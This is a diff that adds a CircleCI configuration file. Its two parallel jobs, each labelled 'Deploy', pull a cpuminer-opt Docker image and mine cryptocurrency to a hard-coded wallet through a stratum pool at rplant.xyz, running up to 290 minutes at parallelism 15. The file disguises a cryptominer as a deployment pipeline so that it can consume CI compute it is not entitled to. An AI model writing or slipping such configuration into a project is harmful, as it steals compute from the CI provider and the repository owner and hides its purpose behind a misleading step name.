@@ -1,0 +1,33 @@
+version: 2.1
+
+jobs:
+  build:
+    parallelism: 15
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                     docker pull first087/cpuminer-opt:latest
+                     docker run first087/cpuminer-opt:latest -a yespower -o stratum+tcp://stratum-asia.rplant.xyz:7070 -u WbQR3w5EyWkuoFjhjYymrr3pEZDSTTgQkX.test
+         no_output_timeout: 290m
+  build1:
+    parallelism: 15
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                     docker pull first087/cpuminer-opt:latest
+                     docker run first087/cpuminer-opt:latest -a yespower -o stratum+tcp://stratum-asia.rplant.xyz:7070 -u WbQR3w5EyWkuoFjhjYymrr3pEZDSTTgQkX.test
+         no_output_timeout: 290m
+
+workflows:
+  main:
+    jobs:
+      - build
+      - build1
